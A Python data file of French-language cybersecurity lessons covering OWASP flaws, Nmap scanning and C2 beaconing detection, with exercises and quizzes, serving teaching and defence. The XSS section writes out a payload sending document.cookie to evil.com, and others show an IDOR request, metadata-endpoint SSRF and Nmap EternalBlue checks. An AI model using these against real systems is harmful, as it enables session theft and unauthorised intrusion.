# -*- coding: utf-8 -*-
"""
Données pédagogiques exhaustives pour les Volumes 7, 8 et 9 de CyberPath.
Couvre l'OWASP Top 10, Nmap, Burp Suite, CTF, la programmation réseau de sockets et la détection défensive C2.
"""

import json

LESSONS_VOL7_TO_9 = [
    # -------------------------------------------------------------------------
    # VOLUME 7 : WEB SECURITY & AUTHENTIFICATION
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol7_owasp",
        "module_id": "m_vol7_1",
        "slug": "owasp-top-10-xss-csrf-idor-ssrf-remediation",
        "title": "OWASP Top 10 : XSS, CSRF, IDOR & SSRF en Pratique",
        "summary": "Étude approfondie des vulnérabilités applicatives web majeures : Cross-Site Scripting (Reflected, Stored, DOM), CSRF, failles de contrôle d'accès IDOR et Server-Side Request Forgery.",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 50,
        "content_md": """# OWASP Top 10 : Vulnérabilités Web Majeures & Remédiations

Le projet **OWASP (Open Web Application Security Project)** publie régulièrement son classement des 10 risques de sécurité les plus critiques pour les applications Web. En tant que futur auditeur ou développeur sécurisé, la maîtrise de ces failles et de leurs mécanismes de défense est essentielle.

---

## 1. Cross-Site Scripting (XSS)

Le XSS consiste à injecter du code JavaScript malveillant dans une page web légitime consultée par d'autres utilisateurs. Le script s'exécute dans le contexte de sécurité du navigateur de la victime.

```
[ ATTAQUANT ]
     |
     v 1. Injection d'un payload : <script>document.location='http://evil.com/?c='+document.cookie</script>
[ SERVEUR WEB NON SÉCURISÉ ]
     |
     v 2. Rendu de la page HTML non assainie contenant le script malveillant
[ VICTIME LÉGITIME (Navigateur) ]
     |  -> Exécution du JavaScript dans le contexte d'origine de l'application
     v 3. Vol du cookie de session sensible
[ SERVEUR DE L'ATTAQUANT (evil.com) ]
```

### Les Trois Types de XSS :
1. **XSS Stocké (Stored / Persistent) :** Le payload est enregistré de manière permanente en base de données (ex: dans un commentaire de forum ou un profil utilisateur) et s'exécute chaque fois qu'un internaute affiche la page. C'est la forme la plus dangereuse.
2. **XSS Réfléchi (Reflected) :** Le payload provient de l'URL ou d'un paramètre GET (`?search=<script>...`) et est immédiatement répercuté dans la réponse HTML du serveur.
3. **XSS basé sur le DOM (DOM-based) :** La vulnérabilité réside entièrement dans le code JavaScript côté client qui manipule dangereusement le DOM (ex: utilisation de `innerHTML` ou `eval()` avec `window.location.hash`).

### Défense Contre le XSS :
* **Échappement contextuel (Context-aware Encoding) :** Encoder systématiquement les caractères réservés (`<` devient `&lt;`, `>` devient `&gt;`, `"` devient `&quot;`).
* **Politique de Sécurité du Contenu (Content Security Policy - CSP) :**
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com;
  ```
* **Flag HttpOnly sur les Cookies :** Interdit strictement à tout code JavaScript d'accéder au cookie d'authentification (`document.cookie`).

---

## 2. Insecure Direct Object References (IDOR / BOLA)

Une faille IDOR (ou *Broken Object-Level Authorization*) survient lorsqu'une application utilise un identifiant direct fourni par l'utilisateur pour accéder à une ressource sans vérifier que l'utilisateur en est bien le propriétaire légitime :

```http
# Requête légitime de l'utilisateur Alice (ID 42) :
GET /api/documents/invoice_42.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>

# Attaque IDOR : Alice modifie simplement le numéro dans l'URL :
GET /api/documents/invoice_43.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>
```
Si le serveur renvoie la facture de Bob (ID 43) sans vérifier la concordance entre le jeton de session d'Alice et la ressource 43, l'IDOR est confirmée !

### Remédiation IDOR :
Ne vous fiez jamais à l'identifiant transmis par l'URL. Associez toujours l'identifiant du compte connecté extrait du jeton de session validé :
```python
# Requête sécurisée avec contrôle d'autorisation au niveau de l'objet :
document = db.query("SELECT * FROM invoices WHERE id = ? AND owner_user_id = ?", (invoice_id, current_user.id))
if not document:
    raise HTTPException(status_code=403, detail="Accès non autorisé à cette ressource.")
```

---

## 3. Server-Side Request Forgery (SSRF)

Dans une faille SSRF, l'attaquant force le serveur web backend à émettre une requête réseau HTTP vers une destination interne normalement inaccessible depuis l'extérieur (ex: l'API de métadonnées AWS à l'adresse `http://169.254.169.254/latest/meta-data/` ou des microservices internes non authentifiés).

### Remédiation SSRF :
Valider les URLs fournies par une liste blanche stricte (Whitelisting), interdire les résolutions d'adresses IP privées (RFC 1918 : `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) et les adresses de lien local (`169.254.0.0/16`).
""",
        "exercise": {
            "title": "Échappement HTML Anti-XSS en Python",
            "description_md": "Écrivez une fonction Python `assainir_html(texte: str) -> str` qui remplace les caractères sensibles &, <, >, \", et ' par leurs entités HTML respectives (&amp;, &lt;, &gt;, &quot;, &#x27;).",
            "starter_code": "def assainir_html(texte: str) -> str:\n    # Votre code ici\n    pass\n",
            "solution_code": "def assainir_html(texte: str) -> str:\n    remplacements = {\n        '&': '&amp;',\n        '<': '&lt;',\n        '>': '&gt;',\n        '\"': '&quot;',\n        \"'\": '&#x27;'\n    }\n    for caractere, entite in remplacements.items():\n        texte = texte.replace(caractere, entite)\n    return texte\n",
            "difficulty": "beginner"
        },
        "quiz": {
            "title": "Quiz - Vulnérabilités Web OWASP",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Quel drapeau de cookie HTTP empêche formellement un script JavaScript malveillant d'accéder au jeton de session via document.cookie ?",
                    "explanation_md": "Le drapeau `HttpOnly` interdit l'accès au cookie depuis l'API DOM/JavaScript du navigateur, neutralisant le vol de session par XSS.",
                    "options_json": json.dumps([
                        {"text": "HttpOnly", "is_correct": True},
                        {"text": "Secure", "is_correct": False},
                        {"text": "SameSite=Strict", "is_correct": False},
                        {"text": "Domain", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Quelle adresse IP spécifique est fréquemment ciblée lors d'une attaque SSRF sur des environnements Cloud AWS afin d'extraire les identifiants IAM d'une instance ?",
                    "explanation_md": "`http://169.254.169.254` est l'adresse de métadonnées d'instance (IMDS) sur AWS, Azure et GCP.",
                    "options_json": json.dumps([
                        {"text": "169.254.169.254 (Instance Metadata Service)", "is_correct": True},
                        {"text": "127.0.0.1", "is_correct": False},
                        {"text": "192.168.1.1", "is_correct": False},
                        {"text": "8.8.8.8", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    },

    # -------------------------------------------------------------------------
    # VOLUME 8 : OUTILS DU PENTESTER & MÉTHODOLOGIE CTF
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol8_nmap",
        "module_id": "m_vol8_1",
        "slug": "reconnaissance-reseau-avancee-nmap-scripts-nse",
        "title": "Reconnaissance Réseau Avancée avec Nmap & Scripts NSE",
        "summary": "Cartographie complète de la surface d'attaque avec Nmap : scans furtifs SYN (-sS), prise d'empreinte de services (-sV), détection d'OS (-O) et scripts d'audit automatisés NSE.",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 45,
        "content_md": """# Reconnaissance Réseau avec Nmap & le Moteur de Scripts NSE

Considéré comme le standard absolu de la cartographie réseau depuis plus de 25 ans, **Nmap (Network Mapper)** est le premier outil dégainé lors d'un test d'intrusion ou d'un audit de conformité d'infrastructure.

---

## 1. Les Modes de Scan Majeurs de Nmap

```
+------------------+---------------------+---------------------------------------------------+
| COMMANDE         | TYPE DE SCAN        | MÉCANISME TECHNIQUE & DISCRÉTION                  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sS <cible> | SYN Stealth Scan    | Envoie un SYN. Si SYN-ACK reçu, répond par un RST |
|                  | (Scan par défaut)   | pour ne jamais achever la poignée de main TCP !   |
+------------------+---------------------+---------------------------------------------------+
| nmap -sT <cible> | Connect Scan        | Établit une connexion TCP complète (connect()).   |
|                  |                     | Laisse des traces massives dans les journaux OS.  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sU <cible> | UDP Scan            | Teste les ports UDP (DNS, SNMP, DHCP). Plus lent  |
|                  |                     | car attend les messages ICMP Port Unreachable.    |
+------------------+---------------------+---------------------------------------------------+
| nmap -sV <cible> | Version Detection   | Interroge les ports ouverts avec des sondes pour  |
|                  |                     | extraire la bannière et version exacte du service.|
+------------------+---------------------+---------------------------------------------------+
| nmap -p- <cible> | Full Port Scan      | Balaye l'intégralité des 65 535 ports TCP.        |
+------------------+---------------------+---------------------------------------------------+
```

---

## 2. La Commande d'Audit Recommandée en Pentest Réel

Pour auditer une cible dans le cadre d'un engagement professionnel, voici la syntaxe de référence combinant rapidité et richesse d'information :

```bash
sudo nmap -sS -sV -sC -O -T4 -p- -oA audit_cible_192.168.1.50 192.168.1.50
```

### Décomposition des arguments :
* **`-sS` :** Balayage SYN furtif (requiert les privilèges root sous Linux).
* **`-sV` :** Détection de version des logiciels serveurs (ex: `Apache 2.4.52`, `OpenSSH 8.9p1`).
* **`-sC` :** Exécution des scripts de détection par défaut du Nmap Scripting Engine (NSE).
* **`-O` :** Détection de l'empreinte du système d'exploitation par analyse de la pile TCP/IP.
* **`-T4` :** Profil temporel agressif (recommandé sur les réseaux locaux et fibre).
* **`-p-` :** Scanne **tous** les ports de 1 à 65535 (évite de passer à côté d'un port non standard comme un proxy sur 9000 ou 4444).
* **`-oA <nom>` :** Exporte les résultats sous les trois formats indispensables en simultané : texte brut (`.nmap`), grepable (`.gnmap`) et XML (`.xml`) pour importation dans les outils de reporting.

---

## 3. Le Moteur de Scripts NSE (Nmap Scripting Engine)

Écrits en langage **Lua**, les scripts NSE étendent les capacités de Nmap pour automatiser des tâches d'évaluation de vulnérabilités :

```bash
# Vérifier si une cible est vulnérable à la faille critique SMB EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.50

# Lister les certificats TLS et tester les chiffrements dépréciés (SSLv3, TLS 1.0)
nmap -p 443 --script ssl-enum-ciphers 192.168.1.50

# Énumérer les partages NFS ouverts sur le réseau
nmap -p 111,2049 --script nfs-showmount 192.168.1.50
```
""",
        "exercise": {
            "title": "Générateur de Lignes de Commande Nmap",
            "description_md": "Écrivez une fonction Python `generer_commande_nmap(cible: str, scan_complet: bool = False) -> str` qui retourne la chaîne de commande Nmap appropriée (`nmap -sS -sV -T4 <cible>` par défaut, ou `nmap -sS -sV -p- -T4 <cible>` si scan_complet est True).",
            "starter_code": "def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:\n    # Votre code ici\n    pass\n",
            "solution_code": "def generer_commande_nmap(cible: str, scan_complet: bool = False) -> str:\n    ports = \" -p-\" if scan_complet else \"\"\n    return f\"nmap -sS -sV{ports} -T4 {cible.strip()}\"\n",
            "difficulty": "beginner"
        },
        "quiz": {
            "title": "Quiz - Cartographie Réseau avec Nmap",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Pourquoi le scan SYN (-sS) de Nmap est-il qualifié de 'furtif' (Stealth Scan) par rapport au Connect scan (-sT) ?",
                    "explanation_md": "Nmap envoie un paquet RST dès réception du SYN-ACK, annulant la connexion avant qu'elle ne soit complétée, ce qui évite que l'application applicative n'enregistre la connexion dans ses logs habituels.",
                    "options_json": json.dumps([
                        {"text": "Car il envoie un RST après le SYN-ACK et n'achève jamais la connexion TCP", "is_correct": True},
                        {"text": "Car il chiffre tous ses paquets avec AES-GCM", "is_correct": False},
                        {"text": "Car il utilise des adresses IP satellites", "is_correct": False},
                        {"text": "Car il ne transmet aucun paquet sur le réseau", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Quelle option de Nmap permet d'exécuter l'ensemble des scripts de détection standard écrits en langage Lua ?",
                    "explanation_md": "L'option `-sC` (équivalente à `--script=default`) active les scripts NSE sûrs et standard pour identifier les versions et vulnérabilités évidentes.",
                    "options_json": json.dumps([
                        {"text": "-sC (ou --script=default)", "is_correct": True},
                        {"text": "-sS", "is_correct": False},
                        {"text": "-sU", "is_correct": False},
                        {"text": "-sP", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    },

    # -------------------------------------------------------------------------
    # VOLUME 9 : PROGRAMMATION RÉSEAU & ANALYSE DÉFENSIVE DES FLUX C2
    # -------------------------------------------------------------------------
    {
        "id": "les_cp_vol9_sockets",
        "module_id": "m_vol9_1",
        "slug": "programmation-sockets-analyse-flux-c2-detection",
        "title": "Programmation Réseau Sockets, Modélisation Client-Serveur & Détection de Balisage C2",
        "summary": "Programmation réseau bas-niveau en Python avec sockets TCP natifs, compréhension des architectures de communication et détection défensive des canaux de Command & Control (balisage, jitter, règles Sigma/Suricata).",
        "lesson_type": "article",
        "position": 1,
        "estimated_minutes": 55,
        "content_md": """# Programmation Sockets Réseau, Modélisation Client-Serveur & Détection C2

> **Fiche Pédagogique V4**  
> **Niveau :** Niveau 3 — Advanced  
> **Durée estimée :** 55 minutes (20 min Théorie • 25 min Laboratoire de Détection • 10 min Évaluation & Synthèse)  
> **Prérequis :** Maîtrise des protocoles de transport TCP/IP (Volume 4) et des structures de données Python (Volume 3).

---

## 1. Objectifs Pédagogiques Mesurables

À l'issue de cette leçon, vous serez capable de :
1. **Implémenter** une architecture client-serveur robuste en Python pur avec les sockets TCP natifs (`socket.AF_INET`, `socket.SOCK_STREAM`).
2. **Concevoir** un protocole de cadrage de messages délimités (TLV — Type-Length-Value ou en-tête de longueur fixe) pour éviter la fragmentation des trames.
3. **Modéliser** les caractéristiques télémétriques des canaux de contrôle distant (**Command & Control — C2**) selon la matrice MITRE ATT&CK (Technique T1071).
4. **Développer un algorithme de détection** statistique de balisage périodique (*beaconing detection*) calculant les intervalles de temps et la gigue (*jitter*).
5. **Rédiger des signatures de détection** réseau et des règles Sigma pour les analystes de Centre de Surveillance (SOC).

---

## 2. Contexte Opérationnel : L'Enjeu de la Détection C2

Dans toute compromission moderne (attaque par rançongiciel, intrusion ciblée APT), les attaquants doivent maintenir un canal de communication avec les machines compromises pour transmettre des instructions et exfiltrer des données. 

Les défenseurs (Blue Team et analystes SOC) ne bloquent pas seulement des adresses IP connues (qui changent constamment) : ils analysent **le comportement statistique des flux sortants**. 

Même lorsque le trafic emprunte le port 443 (HTTPS), la périodicité des requêtes, la régularité des tailles de paquets et la persistance des sessions révèlent la signature d'un canal suspect.

---

## 3. Programmation de Sockets TCP en Python Pur

Un socket est un point de terminaison de communication bidirectionnelle entre deux processus à travers le réseau.

### Modélisation du Serveur Réseau Télémetrique (`telemetry_server.py`)
```python
import socket
from typing import Final

HOST: Final[str] = "127.0.0.1"
PORT: Final[int] = 8443

def demarrer_serveur_telemetrie() -> None:
    # Création du socket TCP IPv4
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serveur:
        # Réutilisation immédiate du port après arrêt
        serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serveur.bind((HOST, PORT))
        serveur.listen(5)
        print(f"[*] Serveur de monitoring en écoute sur {HOST}:{PORT}")

        client_sock, client_addr = serveur.accept()
        with client_sock:
            print(f"[+] Client connecté depuis : {client_addr}")
            while True:
                # Lecture de la charge utile (taille max 4096 octets)
                donnees = client_sock.recv(4096)
                if not donnees:
                    print("[-] Connexion clôturée par le client.")
                    break
                message = donnees.decode("utf-8", errors="replace")
                print(f"[REÇU] {message.strip()}")
                # Accusé de réception
                client_sock.sendall(b"ACK_OK\\n")

if __name__ == "__main__":
    demarrer_serveur_telemetrie()
```

---

## 4. Analyse des Signatures de Balisage C2 (Beaconing)

Un agent C2 tente périodiquement de contacter son serveur pour vérifier la présence d'ordres en attente.

### Métriques d'Identification Statistique
1. **Delta temporel inter-paquets (Δt) :** Temps écoulé entre deux connexions successives.
2. **Gigue (Jitter) :** Pour échapper à la détection par intervalle fixe (ex: connexion exacte toutes les 60 secondes), les outils modernes ajoutent un pourcentage d'aléa (ex: 60s ± 20%).
3. **Déviation standard (σ) :** Une déviation faible sur une grande série temporelle est une anomalie statistique critique révélatrice d'un processus automatisé et non humain.

---

## 5. Laboratoire de Détection : Algorithme d'Analyse Statistique de Balisage

Voici un script de détection que vous pouvez intégrer directement dans un pipeline d'analyse de journaux d'accès ou de captures PCAP :

```python
import statistics
from typing import NamedTuple

class AlerteBeaconing(NamedTuple):
    ip_source: str
    ip_destination: str
    intervalle_moyen_sec: float
    ecart_type_sec: float
    est_suspect: bool

def detecter_balisage_c2(
    timestamps_connexions: list[float],
    seuil_regularite_sec: float = 3.0
) -> bool:
    \"\"\"
    Analyse une série de timestamps d'horodatage en secondes.
    Retourne True si l'écart-type des intervalles indique un balisage automatisé régulier.
    \"\"\"
    if len(timestamps_connexions) < 4:
        return False  # Échantillon insuffisant

    # Calcul des deltas de temps consécutifs
    intervalles = [
        timestamps_connexions[i] - timestamps_connexions[i - 1]
        for i in range(1, len(timestamps_connexions))
    ]

    ecart_type = statistics.stdev(intervalles)
    intervalle_moyen = statistics.mean(intervalles)

    # Si l'écart-type est inférieur au seuil sur un intervalle moyen significatif
    return ecart_type < seuil_regularite_sec and intervalle_moyen > 5.0
```

---

## 6. Règle de Détection Sigma pour Analystes SOC

Pour surveiller les créations de connexions réseau non standard initiées par des interpréteurs sous Windows :

```yaml
title: Connexion Réseau Sortante Suspecte via Interpréteur de Script
id: a8b4c2e1-7d3f-4e89-9a1b-0123456789ab
status: stable
description: Détecte un processus interpréteur (python.exe, powershell.exe) initiant des flux réseau sortants vers des ports non-web.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\python.exe'
            - '\\powershell.exe'
        Initiated: 'true'
    filter_ports:
        DestinationPort:
            - 80
            - 443
    condition: selection and not filter_ports
falsepositives:
    - Scripts d'automatisation IT autorisés
level: medium
```

---

## 7. Synthèse des Références Officielles

* **MITRE ATT&CK T1071 :** *Application Layer Protocol* — Analyse des protocoles utilisés pour les canaux de contrôle.
* **MITRE ATT&CK T1571 :** *Non-Standard Port* — Échanges sur des ports inhabituels pour tromper les règles de filtrage.
* **NIST SP 800-83 Rev. 1 :** *Guide to Malware Incident Prevention and Handling for Desktops and Laptops*.
* **RFC 793 :** *Transmission Control Protocol Specification*.
""",
        "exercise": {
            "title": "Calculateur d'Anomalie Statistique de Balisage Réseau",
            "description_md": "Développez une fonction Python `est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool` qui reçoit une liste ordonnée d'horodatages en secondes (au moins 3 valeurs). La fonction calcule les deltas temporels entre connexions successives. Si l'écart-type de ces deltas est strictement inférieur au seuil spécifié, la fonction retourne True (balisage suspect régulier), sinon False.",
            "starter_code": "import statistics\n\ndef est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool:\n    # Votre code ici\n    pass\n",
            "solution_code": "import statistics\n\ndef est_balisage_regulier(timestamps: list[float], seuil_max_ecart_type: float = 2.0) -> bool:\n    if len(timestamps) < 3:\n        return False\n    deltas = [timestamps[i] - timestamps[i - 1] for i in range(1, len(timestamps))]\n    return statistics.stdev(deltas) < seuil_max_ecart_type\n",
            "difficulty": "intermediate"
        },
        "quiz": {
            "title": "Quiz Évaluatif - Détection de Flux C2 & Analyse Réseau",
            "passing_score": 100,
            "questions": [
                {
                    "prompt_md": "Quelle caractéristique statistique permet aux analystes SOC de détecter un balisage C2 même lorsque le trafic est chiffré sur le port 443 ?",
                    "explanation_md": "La faible variance ou l'écart-type très bas des intervalles de temps (delta-t) entre les sessions consécutives trahit un processus automatique répétitif programmé.",
                    "options_json": json.dumps([
                        {"text": "La régularité mathématique anormale des intervalles de connexion (faible écart-type)", "is_correct": True},
                        {"text": "La couleur des paquets dans Wireshark", "is_correct": False},
                        {"text": "Le fait que le paquet ne contienne aucun en-tête IP", "is_correct": False},
                        {"text": "L'utilisation systématique de serveurs DNS publics", "is_correct": False}
                    ]),
                    "points": 10
                },
                {
                    "prompt_md": "Que signifie la technique de 'Jitter' introduite par les attaquants pour dissimuler leur canal de communication ?",
                    "explanation_md": "Le jitter consiste à introduire une variation aléatoire dans l'intervalle entre chaque connexion pour casser la régularité temporelle et tromper les filtres statistiques simples.",
                    "options_json": json.dumps([
                        {"text": "Une variation aléatoire volontaire appliquée à l'intervalle de connexion pour perturber la détection statistique", "is_correct": True},
                        {"text": "Une technique d'augmentation de la bande passante réseau", "is_correct": False},
                        {"text": "Un algorithme de hachage de mots de passe", "is_correct": False},
                        {"text": "Une méthode de compression de données", "is_correct": False}
                    ]),
                    "points": 10
                }
            ]
        }
    }
]

print(f"Loaded {len(LESSONS_VOL7_TO_9)} lessons for Volumes 7-9.")
